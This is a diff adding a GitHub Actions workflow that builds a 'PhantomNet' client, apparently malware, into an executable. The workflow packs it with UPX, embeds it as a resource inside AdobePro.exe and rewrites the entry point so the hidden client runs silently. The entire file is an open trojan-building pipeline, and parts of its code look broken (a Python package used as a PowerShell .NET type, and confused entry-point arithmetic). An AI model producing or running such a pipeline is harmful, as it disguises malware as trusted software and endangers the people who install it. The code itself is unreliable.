@@ -1,0 +1,56 @@
+name: Build and Embed PhantomNet Client
+
+on:
+  push:
+    branches:
+      - main
+  pull_request:
+    branches:
+      - main
+
+jobs:
+  build:
+    runs-on: windows-latest
+
+    steps:
+    - name: Checkout code
+      uses: actions/checkout@v2
+
+    - name: Set up Python
+      uses: actions/setup-python@v2
+      with:
+        python-version: '3.9'
+
+    - name: Install Python dependencies
+      run: |
+        pip install pyinstaller petools
+
+    - name: Install UPX
+      run: |
+        Invoke-WebRequest -Uri "https://github.com/upx/upx/releases/download/v4.0.2/upx-4.0.2-win64.zip" -OutFile "upx.zip"
+        Expand-Archive -Path "upx.zip" -DestinationPath "."
+
+    - name: Convert phantomnet-client.py to executable
+      run: |
+        pyinstaller --onefile phantomnet-client.py --distpath output
+
+    - name: Pack the executable with UPX
+      run: |
+        .\upx-4.0.2-win64\upx.exe output\phantomnet-client.exe
+
+    - name: Embed the executable into AdobePro.exe
+      run: |
+        $adobeProData = [System.IO.File]::ReadAllBytes("AdobePro.exe")
+        $pe = New-Object petools.PE($adobeProData)
+        $embeddedExeData = [System.IO.File]::ReadAllBytes("output\phantomnet-client.exe")
+        $pe.AddResource("EMBEDDED_EXE", $embeddedExeData)
+        [System.IO.File]::WriteAllBytes("AdobePro_modified.exe", $pe.Data)
+
+    - name: Modify AdobePro.exe to run the embedded executable silently
+      run: |
+        $adobeProData = [System.IO.File]::ReadAllBytes("AdobePro_modified.exe")
+        $pe = New-Object petools.PE($adobeProData)
+        $entryPoint = $pe.EntryPoint
+        $newEntryPoint = $pe.RvaToOffset($entryPoint) + 0x10  # Adjust the offset as needed
+        $pe.EntryPoint = $newEntryPoint
+        [System.IO.File]::WriteAllBytes("AdobePro_final.exe", $pe.Data)
